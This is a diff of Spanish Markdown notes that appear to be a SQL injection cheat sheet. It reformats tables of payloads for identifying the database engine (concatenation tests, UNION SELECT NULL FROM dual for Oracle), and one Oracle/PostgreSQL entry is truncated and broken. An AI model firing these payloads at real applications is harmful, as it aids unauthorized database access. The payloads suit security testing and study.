@@ -42,11 +42,11 @@ Lanza uno a uno contra el punto de inyección. En cuanto uno dé respuesta "true
 
 **Concatenación**
 
-|Motor|Payload|
-|---|---|
-|MSSQL|`' AND 'a'+'a'='aa'-- -`|
-|Oracle / PostgreSQL|`' AND 'a'|
-|MySQL / MariaDB|`' AND 'a' 'a'='aa'-- -`|
+| Motor               | Payload                  |
+| ------------------- | ------------------------ |
+| MSSQL               | `' AND 'a'+'a'='aa'-- -` |
+| Oracle / PostgreSQL | `' AND 'a'               |
+| MySQL / MariaDB     | `' AND 'a' 'a'='aa'-- -` |
 
 **Comentarios**
 
@@ -57,10 +57,10 @@ Lanza uno a uno contra el punto de inyección. En cuanto uno dé respuesta "true
 
 **Tabla `dual` (Oracle)**
 
-|Payload|Resultado esperado|
-|---|---|
-|`' UNION SELECT NULL-- -`|Falla en Oracle (falta FROM)|
-|`' UNION SELECT NULL FROM dual-- -`|Si esto funciona tras fallar el anterior → Oracle|
+| Payload                             | Resultado esperado                                |
+| ----------------------------------- | ------------------------------------------------- |
+| `' UNION SELECT NULL-- -`           | Falla en Oracle (falta FROM)                      |
+| `' UNION SELECT NULL FROM dual-- -` | Si esto funciona tras fallar el anterior → Oracle |
 
 **Versión** (ajusta nº de columnas según el paso 1)
 
